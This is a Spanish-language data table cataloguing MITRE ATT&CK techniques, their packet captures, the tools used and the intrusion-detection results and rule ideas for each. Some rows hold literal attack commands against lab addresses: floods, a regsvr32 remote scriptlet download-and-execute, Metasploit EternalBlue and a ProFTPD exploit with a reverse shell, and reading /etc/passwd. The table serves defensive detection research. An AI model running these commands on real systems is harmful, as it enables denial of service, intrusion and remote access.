Impact;-;TA0040;Endpoint Denial of Service;T1499;Application or System Exploitation;T1499.004;Suplantación MAC;ip;T1499-Mac_spoof_[1].pcapng;1;1;0;SI;"""Mediante el uso de preprocesadores, la detección de este ataque es posible estableciendo un asociación entre la IP a proteger y su dirección MAC correspondiente. De esta forma, se puede fundar una regla que detecte mensajes ARP que incumplen esta asociación y que avistan de un posible ataque por suplantación MAC""";-;Manual [1] / 2.1.1.1.2;Manual [1] / E.2;-;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;1
Impact;-;TA0040;Endpoint Denial of Service;T1499;Service Exhaustion Flood;T1499.002;Reseteo de Conexión;"""ettercap, netwox, nping""";T1499-Reseteo_[1].pcapng;1;1;0;NO;Detección por anomalías que identifique reseteos de conexión periódicos y desde direcciones sospechosas;-;Manual [1] / 2.3.1.1.6;Manual [1] / E.12;-;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Impact;-;TA0040;Endpoint Denial of Service;T1499;OS Exhaustion Flood;T1499.001;Inundación SYN con suplantación;hping3;T1499-Syn_suplantacion_[1].pcapng;1;1;0;SI;Regla genérica que detecte el envío prolongado de mensajes TCP SYN que dejan los sockets del equipo a proteger en estado SYN-RECV (no se terminan los handshake de las conexiones TCP establecidas);-;Manual [1] / 2.3.1.1.3;Manual [1] / E.9;-;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;1
Impact;-;TA0040;Endpoint Denial of Service;T1499;OS Exhaustion Flood;T1499.001;LAND;hping3;T1499-Land_[1].pcapng;1;1;0;SI;Regla genérica que detecte envío de mensajes TCP SYN procedentes de la misma dirección IP a la que van dirigidos los paquetes. Los puertos origen/destino pueden ser incluso idénticos;-;Manual [1] / 2.3.1.1.5;Manual [1] / E.11;-;1;1;0;1;0;1;0;0.00;1;1.00;1;1.00;1;1.00;-;0;0.00;1
Impact;-;TA0040;Endpoint Denial of Service;T1499;Service Exhaustion Flood;T1499.002;Inundación DHCP / Inanición;"""DHCPig, yersinia""";T1499-Dhcp_flood_[1].pcapng;;1;0;SI;"""Regla genérica que detecte un envío masivo de procedimientos DHCP completos (DISCOVERY, OFFER, REQUEST, ACK)""";-;Manual [1] / 2.4.2.1.1;Manual [1] / E.18;Manual [4] / 4.1.39;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;1
Impact;-;TA0040;Endpoint Denial of Service;T1499;Service Exhaustion Flood;T1499.002;Reflexión SYN-ACK;hping3;T1499-Reflexion_synack_[1].pcapng;;1;0;SI;Regla que detecte el envío de mensajes TCP SYN-ACK no solicitados previamente por el la red a proteger;-;Manual [1] / 3.4.2;Manual [1] / E.10;-;1;1;0;1;0;0;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;1
Impact;-;TA0040;Endpoint Denial of Service;T1499;Service Exhaustion Flood;T1499.002;Envio solicitudes HTTP a baja tasa;Slowhttptest;T1499.02-Slowhttptest-C2018_[6].pcapng;;1;0;SI;Regla que detecte el envío de mensajes HTTP a baja tasa;Uso de Slowhttptest para denegación de servicio a servidor web;Dataset CIC-2018;Dataset CIC-2018;Dataset CIC-2018;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;1
Impact;-;TA0040;Endpoint Denial of Service;T1499;Service Exhaustion Flood;T1499.002;Envio solicitudes HTTP parciales;Slowloris;T1499.02-Slowloris-C2018_[6].pcapng;;1;0;SI;Regla que detecte el envío de mensajes HTTP parciales o uso de Slowloris;Uso de Slowloris para denegación de servicio a servidor web;Dataset CIC-2018;Dataset CIC-2018;Dataset CIC-2018;1;1;0;1;0;1;0;0.00;0;0.00;1;1.00;1;1.00;-;1;1.00;1
Impact;.;TA0040;Endpoint Denial of Service;T1499;Application Exhaustion Flood;T1499.003;Denegación de servicio a servidor web;Hulk;T1499.03-Hulk-C2018_[6].pcapng;;1;0;SI;Reglas que detecen envío masivo de solicitudes a servidor web;Uso de Hulk para denegación de servicio a servidor web;Dataset CIC-2018;Dataset CIC-2018;Dataset CIC-2018;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;1
Impact;.;TA0040;Endpoint Denial of Service;T1499;Application Exhaustion Flood;T1499.003;Denegación de servicio a servidor web;GoldenEye;T1499.03-GoldenEye-C2018_[6].pcapng;;1;0;SI;Reglas que detecen envío masivo de solicitudes a servidor web;Uso de GoldenEye para denegación de servicio a servidor web;Dataset CIC-2018;Dataset CIC-2018;Dataset CIC-2018;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;1
Impact;-;TA0040;Network Denial of Service;T1498;Direct Network Flood;T1498.001;Inundación tabla MAC;Macof;T1498.001-MAC_table_flood_[3].pcapng;;1;0;NO;-;Inundacion tabla MAC mediante Macof. Comando: sudo macof -i enp0s9 -d 172.16.1.1;Manual [3] / 3.8.18;Manual [3] / 3.18.4;Manual [3] / 3.18.5;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Impact;-;TA0040;Network Denial of Service;T1498;Direct Network Flood;T1498.001;Inundación UDP;"""Low Orbit Ion Canon (LOIC) for UDP, TCP, or HTTP requests""";T1498.001-UDP_flood_1-C2018_[6].pcapng;;1;0;SI;Regla genérica que detecte un envío masivo de mensajes UDP con destino el mismo puerto objetivo;-;Dataset CIC-2018;Dataset CIC-2018;Dataset CIC-2018;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;1
Impact;-;TA0040;Network Denial of Service;T1498;Direct Network Flood;T1498.001;Inundación UDP;"""Low Orbit Ion Canon (LOIC) for UDP, TCP, or HTTP requests""";T1498.001-UDP_flood_2-C2018_[6].pcapng;;1;0;SI;Regla genérica que detecte un envío masivo de mensajes UDP con destino el mismo puerto objetivo;-;Dataset CIC-2018;Dataset CIC-2018;Dataset CIC-2018;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;1
Impact;-;TA0040;Network Denial of Service;T1498;Direct Network Flood;T1498.001;Inundación HTTP;"""Low Orbit Ion Canon (LOIC) for UDP, TCP, or HTTP requests""";T1498.001-HTTP_flood-C2018_[6].pcapng;;1;0;SI;Regla que detecte envío masivo de mensajes HTTP;-;Dataset CIC-2018;Manual [4] / B.37;Dataset CIC-2018;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;1
Impact;-;TA0040;Network Denial of Service;T1498;Direct Network Flood;T1498.001;Inundación TCP;"""Low Orbit Ion Canon (LOIC) for UDP, TCP, or HTTP requests""";T1498.001-TCP_flood-C2018_[6].pcapng;;1;0;SI;Regla que detecte envío masivo de mensajes TCP;-;Dataset CIC-2018;Manual [4] / B.37;Dataset CIC-2018;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;1
Impact;-;TA0040;Network Denial of Service;T1498;Direct Network Flood;T1498.001;Inundación UDP;"""Caldera, hping3""";T1498.001-UDP_flood_[2].pcapng;;1;0;NO;-;Inundacion UDP en la red de la víctima. Comando: timeout 10s hping3 --udp --flood 192.168.2.2;Manual [2] / 3.1.10.2;Manual [2];-;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Impact;-;TA0040;Network Denial of Service;T1498;Reflection Amplification;T1498.002;Amplificación DNS;dnsdrdos;T1498-Amplif_dns_[1].pcapng;;1;0;SI;Regla genérica que detecte un envío masivo de respuestas DNS no solicitadas con un mismo nombre resuelto hacia la red protegida;-;Manual [1] / 3.5.1;Manual [1] / E.14;Manual [4] / 4.1.35;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;1;1.00;-;1;1.00;1
Impact;-;TA0040;Network Denial of Service;T1498;Reflection Amplification;T1498.002;Fraggle;hping3;T1498-Fraggle_[1].pcapng;;1;0;SI;"""Regla genérica que detecte un envío masivo de datagramas UDP hacia un puerto concreto, con fin de saturarlo y causar su inoperatividad""";-;Manual [1] / 3.4.5;Manual [1] / E.13;Manual [4] / 4.1.36;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;1
Impact;-;TA0040;Network Denial of Service;T1498;Reflection Amplification;T1498.002;Smurf;hping3;T1498-Smurf_[1].pcapng;;1;0;SI;Regla genérica que detecte un envío masivo de respuestas ICMP;-;Manual [1] / 3.3.1;Manual [1] / E.7;Manual [4] / 4.1.37;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;1
Impact;-;TA0040;Network Denial of Service;T1498;-;-;Inundación de TCBPDU;yersinia;T1498-Tcbpdu_[1].pcapng;;1;0;NO;-;-;Manual [1] / 3.2.2;Manual [1] / E.5;Manual [4] / 4.1.38;1;0;0;1;1;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Impact;-;TA0040;Resource Hijacking;T1496;-;-;Descarga y puesta en marcha de software de criptominado;XMRIG;T1496-Cryptomining_[2].pcapng;;1;0;NO;-;"""Instalacion y uso de software de minado. Comando: wget https://github.com/xmrig/xmrig/releases/download/v6.11.2/xmrig-6.11.2-linux-x64.tar.gz;""";Manual [2] / 3.3.2.1;Manual [2];Manual [2] / 4.2.2.3;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Impact;-;TA0040;Defacement;T1491;Internal Defacement;T1491.001;Modificar fondo de pantalla equipo victima;PowerShell;T1491.001-Internal_Defacement_[5].pcapng;;1;0;NO;Detectable por listas negras/anomalías;Modificar fondo de pantalla equipo victima;Manual [5] / 3.5.10.1;Manual [5];;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Command and Control;-;TA0040;Application Layer Protocol;T1071;DNS;T1071.004;Command - Control via DNS;dnscat2;T1071-Tunel_[1].pcapng;;1;0;SI;Regla genérica que detecta uso de dnscat;"""Envio de peticiones DNS como canal de comunicaciones con la víctima. Comando: timeout 15s /root/dnscat2/client/dnscat --dns server=192.168.2.2,port=53 --secret= acabc17b6904a7f8fada4e7f8de4bce8 --no-encryption""";Manual [1] / 5.2.3;Manual [1] / E.17;Manual [4] / 4.1.30;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;1;1.00;1
Command and Control;-;TA0040;Multi-Stage Channels;T1104;-;-;Sesión Remota + Ataque C2;"""RDP, Covenant""";T1104-Multi_stage_channels_[4].pcapng;;1;1;NO;Detección por anomalías. Investigación de las sesiones establecidas en el equipo atacante (siempre que sea posible) para identificar un rastro de otra dirección.;"""Envio de peticiones DNS como canal de comunicaciones con la víctima. Comando: timeout 15s /root/dnscat2/client/dnscat --dns server=192.168.2.2,port=53 --secret= acabc17b6904a7f8fada4e7f8de4bce8 --no-encryption""";Manual [4] / 3.22;Manual [4] / B.22;Manual [4] / 4.22;1;0;1;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Command and Control;-;TA0040;Fallback Channels;T1008;-;-;Traspaso de canal primario C2 a canal alternativo;Covenant;T1008-Fallback_channels_[4].pcapng;;1;0;SI*;"""La detección de la creación del canal es posible para este caso concreto, en el que el cortafuegos detecta la creación de ambos canales. Sin embargo, si ambos canales, tanto primario como secundario están establecidos, y no se ha detectado su creación, el cambio de uno a otro es inapreciable por el cortafuegos.""";-;Manual [4] / 3.19;Manual [4] / B.19;Manual [4] / 4.19;1;1;0;1;0;1;0;0.00;1;1.00;1;1.00;1;1.00;-;1;1.00;1
Command and Control;-;TA0040;Web Service;T1102;One-Way Communication;T1102.003;Subida de información confidencial a Workspace de Google Drive;"""Covenant, Google Drive API""";T1102.003-Web_service-one_way_communication_[4].pcapng;;1;1;NO;"""Detección por anomalías, observando actividad inusual relacionada con el uso de servicios web (subidas pesadas de información a la nube, comunicación periódica con servidores web concretos, etc)""";-;Manual [4] / 3.21;Manual [4] / B.21;Manual [4] / 4.21;1;1;1;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Command and Control;-;TA0040;Proxy;T1090;Internal Proxy;T1090.001;Uso de Equipo interno como Proxy para el ataque C2;Covenant;T1090-Proxy_internal_proxy_[4].pcapng;;1;1;NO;"""Aunque sí es detectable la conexión C2 directa con el atacante, no existe un mecanismo de detección concreto que pueda identificar el uso de un proxy, más allá de una detección por anomalías, como la repetición de paquetes, dando a entender que un equipo interno está replicando paquetes, y por tanto está actuando como proxy""";-;Manual [4] / 3.20;Manual [4] / B.20;Manual [4] / 4.20;1;1;1;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Command and Control;-;TA0040;Data Obfuscation;T1001;Protocol Impersonation;T1001.003;Falsificación de protocolos de conexión segura como SSL o TLS;FakeTLS (raykaryshyn Github);T1001.003-Data_obfuscation_protocol_impersonation_[4].pcapng;;1;0;NO*;Regla personalizada que compruebe el campo Server Name y mediante DNS asegure si se corresponde con la dirección IP a la que se está accediendo.;-;Manual [4] / 3.17;Manual [4] / B.17;Manual [4] / 4.17;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;1
Command and Control;-;TA0040;Data Obfuscation;T1001;Steganography;T1001.002;Inserción de información confidencial en una imagen JPG;"""Covenant, SSH, scp, Powershell""";T1001.002-Data_obfuscation_steganography_[4].pcapng;;1;0;NO;"""Detección por anomalías y/o estegoanálisis, envío de imágenes o ficheros con formato poco común entre equipos, existencia de ficheros comprimidos sospechosos, etc.""";-;Manual [4] / 3.18;Manual [4] / B.18;Manual [4] / 4.18;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;1;1.00;0
Command and Control;-;TA0040;Ingress Tool Transfer;T1105;-;-;Transferencia de archivos de un servidor C2 a un equipo previamente comprometido;"""Metasploit, FTP""";T1105-Ingress_Tool_Transfer_[5].pcapng;;1;0;SI;"""Reglas genéricas que detecten un traspaso de archivos entre equipos utilizando protocolos de transferencia de ficheros como SMB, FTP... Dependiendo de las circunstancias del ataque tambien es importante detectar la transferencia de archivos malware que sean detectables mediante tráfico de red.""";"""Servidor FTP en el servidor C2. A través de la conexión del atacante a la víctima, usando el comando ftp transferimos herramientas desde el servidor C2 a la víctima""";Manual [5] / 3.5.8.1;Manual [5];;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;1;1.00;-;0;0.00;1
Command and Control;-;TA0040;Data Encoding;T1132;Standard Encoding;T1132.001;Codificacion de mensajes entre la victima y el C2 Server mediante Base64;"""Metasploit, curl, base64""";T1132.001_Standard_Encoding_[5].pcapng;;1;0;NO;Deteccion por anomalias;Servidor HTTP en el C2 Server. Intercambio de mensajes entre la victima y atacante mediante base64;Manual [5] / 3.5.8.2;Manual [5];;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Command and Control;-;TA0040;Remote Access Software;T1219;-;-;Uso de TeamViewer para establecer canal de comunicación alternativo;TeamViewer;"""T1219-RemoteAccessSoftwareLocal_[5].pcapng, T1219-RemoteAccessSoftwareNAT_[5].pcapng""";;1;0;NO;"""Deteccion por listas negras/anomalías. Monitorizar tráfico de red correspondiente a softwares de acesso remoto(AnyDesk, TeamViewer...)""";Conexion mediante TeamViewer entre dos equipos;Manual [5] / 3.5.8.3;Manual [5];;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Command and Control;-;TA0040;Dynamic Resolution;T1568;Fast Flux DNS;T1568.001;Esconder un C2 Server mediante un servidor DNS con bajo TTL y modo Fast Flux;"""bind, Metasploit""";T1568-fastFluxDNS_[5].pcapng;;1;0;NO;Deteccion por anomalias o listas negras;"Servidor DNS ""Round Robin""";Manual [5] / 3.5.8.4;Manual [5];;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Command and Control;-;TA0040;Hide Infrastructure;T1665;-;-;Esconder el servidor C2 utilizando un Proxy;"""Metasploit, HTTP Server""";T1665-Hide_Infrastructure_[5].pcapng;;1;0;NO**;"""Detección por reglas/anomalías. Resulta importante monitorizar tráfico de red con destino a dominios incluidos en listas negras, conexiones a equpos externos…""";Esconder el servidor C2 utilizando un proxy;Manual [5] / 3.5.8.5;Manual [5];;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;1;1.00;1
Command and Control;-;TA0040;Protocol Tunneling;T1572;-;-;Tunelizar la conexión al C2 Server mediante SSH;"""SSH, Metasploit""";T1572-Protocol_Tunneling_[5].pcapng;;1;0;NO;"""Deteccion por anomalías, monitorizando la creacion de nuevas conexiones""";Tunelizar una conexion mediante SSH;Manual [5] / 3.5.8.6;Manual [5];;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;1;1.00;0
Command and Control;-;TA0040;Encrypted Channel;T1573;Assymetric Cryptography;T1573.002;Encriptar conexion con C2 Server;"""Metasploit, OpenSSL""";T1573.002_AssymetricCryptography_[5].pcapng;;1;0;NO**;"""Deteccion por anomalías, monitorizando la creacion de nuevas conexiones""";Encriptar conexion al C2 Server;Manual [5] / 3.5.8.7;Manual [5];;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;1
Command and Control;-;TA0040;Non-Standard Port;T1571;-;-;Sesión SSH en puerto 2200;ssh;T1571-SSH_[2].pcapng;;1;0;NO;-;Establecer una sesion SSH sobre un puerto no estandar. Comando: sshpass -p salas ssh salas@192.168.2.2 -p 2200 cat /etc/passwd;Manual [2] / 3.1.9.1;Manual [2];-;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Command and Control;"""Defense Evasion, Persistence""";TA0040;Traffic Signaling;T1205;Port Knocking;T1205.001;Esconder y activar un puerto de forma remota;Knockd;T1205.001-Port_Knocking_[3].pcapng;;1;0;NO;-;"""Ocultar y activar un puerto remotamente, haciendo primero peticiones a ciertos puertos de forma secuencial. Comando: knock -v 172.16.2.2 7000 8000 9000""";Manual [3] / 3.8.11;Manual [3] / 3.8.11.4;Manual [3] / 3.8.11.5;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Defense Evasion;-;TA0005;Indicator Removal;T1070;Network Share Connection Removal;T1070.005;Eliminación de conexiones establecidas via Network Share en Windows;Comando Net Use;T1070-Indicator_removal_network_share_connection_removal_[4].pcapng;;1;0;NO;Detección por anomalías basada en desconexión repentina procedente de una dirección de varios recursos compartidos;-;Manual [4] / 3.8;Manual [4] / B.8;Manual [4] / 4.8;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Defense Evasion;-;TA0005;Modify Registry;T1112;-;-;Modificación del Registro de forma remota;reg (Remoto);T1112-Modify_registry_[4].pcapng;;1;0;SI;Regla que detecte el envío de mensajes con protocolo WINREG o Remote Registry Service;-;Manual [4] / 3.9;Manual [4] / B.9;Manual [4] / 4.9;1;1;0;1;0;1;0;0.00;0;0.00;1;1.00;1;1.00;-;0;0.00;1
Defense Evasion;-;TA0005;Rogue Domain Controller;T1207;-;-;DCShadow: registro de un DC fraudulento para habilitar la manipulación de datos en un entorno Active Directory;mimikazt;T1207-Rogue_domain_controller_[4].pcapng;;1;0;SI;Regla que detecte una llamada a la función DRSUAPI_REPLICA_ADD (5);-;Manual [4] / 3.10;Manual [4] / B.10;Manual [4] / 4.10;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;1
Defense Evasion;-;TA0005;System Binary Proxy Execution;T1218;Regsvr32;T1218.010;Ejecución de COM scriptlet remoto;Regsvr32.exe;T1218.010-COM_Scriptlet_[2].pcapng;;1;0;NO;-;"""Aprovechar vulnerabilidad regsvr32.exe descargando y ejecutando scripts y librerias evadiendo controles de seguridad Windows. Comando: C:\Windows\system32\regsvr32.exe /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct scrobj.dll""";Manual [2] / 3.3.1.1;Manual [2];-;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Defense Evasion;-;TA0005;Template Injection;T1221;-;-;Inyectar un fichero mediante Phishing .docx con macros modificadas que permita pasar desapercibido;Sitios web convencionales (Gmail);T1221-Template_Injection_[5].pcapng;;1;0;NO**;"""Detección por lista negra/anomalías. Debería monitorizarse y detectar tráfico de red hacia direcciones o dominios marcados en listas negras. En algún caso concreto, se puede descargar y ejecutar malware por lo que se debe monitorizar y detectar la descarga de este tipo de ficheros""";"""Modificación de fichero .docx para, mediante macros, provocar la descarga y ejecución de malware en el equipo víctima""";Manual [5] / 3.5.4.1;Manual [5];;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;1
Defense Evasion;-;TA0005;Network Boundary Bridging;T1599;NAT Traversal;T1599.001;Modificación de políticas de red para permitir tráfico externo a la red interna;iptables;"""T1599-NBB1_[5].pcapng, T1599-NBB2_[5].pcapng""";;1;0;NO;Deteccion por anomalías;Equipo intermedio entre red interna de la víctima y el atacante con firewall. El atacante con acceso a este equipo intermedio modifica las reglas del firewall iptables para permitir su tráfico.;Manual [5] / 3.5.4.2;Manual [5];;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Defense Evasion;-;TA0005;Network Boundary Bridging;T1599;-;-;Salto de VLAN;ip;T1599-Salto_vlan_[1].pcapng;;1;0;NO;"""Detección por anomalías y estudio de topología de red, que detecte posibles vulnerabilidades relacionadas con el etiquetado apilable 802.1Q""";-;Manual [1] / 3.2.1;Manual [1] / E.4;;1;1;0;1;1;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Defense Evasion;-;TA0005;Build Image on Host;T1612;-;-;Creacion y montado de un contenedor con un servidor SSH sobre un equipo previamente vulnerado;"""DockerAPI, SSH""";"""T1612-BuildImageOnHostLocal_[5].pcapng, T1612-BuildImageOnHostNAT_[5].pcapng""";;1;0;SI;Regla genérica que detecte descargas de contenedores mediante Docker API;Construir contenedor sobre el equipo víctima para evitar ser detectados.;Manual [5] / 3.5.4.3;Manual [5];;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;1
Lateral Movement;-;TA0008;Remote Services;T1021;SSH;T1021.004;Sesión SSH;SSH;T1021-remote_services_ssh_[3].pcapng;;1;0;SI;;-;;;;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;;;
Lateral Movement;-;TA0008;Exploitation of Remote Services;T1210;-;-;EternalBlue;Metasploit;T1210-Eternal_blue_[2].pcapng;;1;0;SI;Regla genérica que detecte uso de EternalBlue;"""Uso de exploit Eternalblue para obtener movimiento lateral y establecimiento de meterpreter. Comando: msfconsole -x ""use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 192.168.2.2; set LHOST 192.168.1.3; run -z; sessions -c getuid; sessions -k 1; exit""""";Manual [2] / 3.1.7.1;Manual [4] / B.29;Manual [2] / 4.1.1.4;1;1;0;1;0;1;1;1.00;1;1.00;1;1.00;1;1.00;-;1;1.00;1
Lateral Movement;-;TA0008;Exploitation of Remote Services;T1210;-;-;Ataque Web;"""DVWA, In-house selenium framework""";T1210-Web_attack-C2018_[6].pcapng;;1;0;NO;-;-;Dataset CIC-2018;Manual [4] / B.36;Dataset CIC-2018;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Lateral Movement;-;TA0008;Exploitation of Remote Services;T1210;-;-;Ejecución de código remoto basado en vulnerabilidades de servidor FTP;Metasploit;T1210-Remote_code_execution_[2].pcapng;;1;0;SI;Regla genérica que detecte intento de ejecucion remota de codigo en servidor FTP;"Uso de comandos SITE/CPFR/CPTO en la version 1.3.5 de ProFTPD que permite copiar ficheros a cualquier usuario no autenticado. Comando: msfconsole -x ""use exploit/unix/ftp/proftpd_modcopy_exec; set RHOSTS 192.168.2.2; set SITEPATH /var/www/html; set LHOST 192.168.1.3; set LPORT 4444; set payload cmd/unix/reverse_perl; run -z; sessions -c ls; sessions -k 1; exit""";Manual [2] / 3.1.7.2;Manual [4] / B.30;Manual [2] / 4.2.1.9;1;1;0;1;0;1;0;0.00;0;0.00;1;1.00;1;1.00;-;1;1.00;1
Lateral Movement;-;TA0008;Remote Service Session Hijacking;T1563;RDP Hijacking;T1563.002;Secuestro de sesión RDP mediante tscon.exe;tscon.exe;T1563.002_RDPHijacking_[5].pcapng;;1;0;SI;Regla genérica para detectar conexiones RDP entre un orígen y un servidor o destino;"""Uso de Windows Server 2012 R2 con DNS, Active Directory y Servicio de Escritorio Remoto""";Manual [5] / 3.5.7.1;Manual [5];;1;1;0;1;0;1;1;1.00;1;1.00;1;1.00;1;1.00;-;0;0.00;1
Lateral Movement;-;TA0008;Lateral Tool Transfer;T1570;-;-;Transferencia de herramientas para la continuación del ataque entre máquinas utilizando protocolos de compartición de archivos;Metasploit;T1570-Lateral_Tool_Transfer_[5].pcapng;;1;0;SI;"""Reglas genéricas que detecten un traspaso de archivos entre equipos utilizando protocolos de transferencia de ficheros como SMB, FTP... Dependiendo de las circunstancias del ataque tambien es importante detectar la transferencia de archivos malware que sean detectables mediante tráfico de red.""";Transferencia mediante FTP de ficheros entre dos equipos;Manual [5] / 3.5.7.2;Manual [5];;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;1;1.00;1
Lateral Movement;-;TA0008;Internal Spear-phishing;T1534;-;-;Phishing interno entre equipos pertenecientes a un dominio con servidor de correo habilitado;"""MailEnabler, Thunderbird""";T1534-Internal_spearphishing_[4].pcapng;;1;0;NO;"""Detección por anomalías, análisis de la estructura de correos electrónicos, petición de información confidencial, etc""";-;Manual [4] / 3.14;Manual [4] / B.14;Manual [4] / 4.14;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Discovery;-;TA0007;Network Service Discovery;T1046;-;-;Descubrimiento de servicios y version;Nikto;T1046-Version_services_detection1_[3].pcapng;;6270;0;SI;"""Múltiples mecanismos. Por ejemplo, regla que detecte un escaneo de puertos (alto número de peticiones hacia un rango de puertos en poco tiempo)""";-;Manual [3] / 3.8.3;Manual [3] / 3.8.3.4;Manual [3] / 3.8.3.5;1;1;0;1;0;1;0;0.00;48;0.01;48;0.01;73;0.01;"""Existen 6270 rutas diferentes en el escaneo de rutas. Es decir, 6270 mensajes HTTP GET. Snort detecta el uso de Nikto para el escaneo web y detecta el acceso a diferentes rutas y intentos de diferentes ataques (Ejemplo SID 2009325) que no se corresponden con el ataque realizado. En FortiGate hay que descartar las alertas relacionadas con la herramienta usada, por lo que detectan 208 instancias de ataque""";208;0.03;1
Discovery;-;TA0007;Network Service Discovery;T1046;-;-;Descubrimiento de servicios y version;nmap;T1046-Version_services_detection2_[3].pcapng;;65536;0;SI;"""Múltiples mecanismos. Por ejemplo, regla que detecte un escaneo de puertos (alto número de peticiones hacia un rango de puertos en poco tiempo)""";-;Manual [3] / 3.8.3;Manual [3] / 3.8.3.4;Manual [3] / 3.8.3.5;1;1;0;1;0;0;3;0.00;49;0.00;49;0.00;51;0.00;"""Se realiza un escaneo completo de puertos. Snort detecta el escaneo de puertos mediante los SID 2009358 detectando el uso de nmap. Además, detecta el escaneo de diferentes rangos de puertos como el SID 2002910. FortiGate sólo detecta el descubrimiento de puertos relacionados con el servicio HTTP""";4;0.00;1
Discovery;-;TA0007;Network Service Discovery;T1046;-;-;DDos + Escaneo de puertos;"""Low Orbit Ion Canon (LOIC) for UDP, TCP, or HTTP requests""";T1046-C2018_[6].pcapng;;1;0;NO**;"""En determinadas circunstancias, si el envío de paquetes constituye una amenaza de denegación de servicio, podría detectarse el envío masivo de paquetes""";-;Dataset CIC-2018;Manual [4] / B.31;Dataset CIC-2018;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;1;1.00;-;1;1.00;1
Discovery;-;TA0007;Remote System Discovery;T1018;-;-;Descubrimiento de servicios y puertos;nmap;T1018-service_discovery_[3].pcapng;;1000;0;SI;Regla que detecte envío de mútliples peticiones a un rango de puertos en un tiempo determinado;-;Manual [3] / 3.8.1;Manual [3] / 3.8.1.4;Manual [3] / 3.8.1.5;1;1;0;1;0;1;0;0.00;44;0.04;44;0.04;44;0.04;"""En este ataque se realiza el escaneo de 1000 puertos. Sin embargo, no se detecta el uso de nmap y solo se detectan los rangos de puertos 5900-5920 y 5800-5820 (SIDS 2002911 2002910) y los puertos 3306,1433,1521,5432. FortiGate sólo detecta este ataque para 6 puertos concretos""";6;0.01;1
Discovery;-;TA0007;Group Policy Discovery;T1615;-;-;Comandos mediante Powershell para obtener información sobre configuraciones de políticas de grupo;PowerShell;T1615-Group_Policy_Discovery_[5].pcapng;;41;0;NO;Detección por anomalías;Ejecución de comandos mediante Powershell para comprobar políticas de grupo;Manual [5] / 3.5.6.1;Manual [5];;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;Misma consulta realizada muchas veces repetida;0;0.00;0
Discovery;-;TA0007;System Owner;T1033;-;-;Descubrimiento de sesión de usuario en equipo remoto;"""quser, qwinsta""";T1033-System_owner_[4].pcapng;;1;0;SI;Regla que detecte múltiples interacciones con la API LSM_API_service del servicio RPC desde el mismo equipo origen.;-;Manual [4] / 3.12;Manual [4] / B.12;Manual [4] / 4.12;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;1
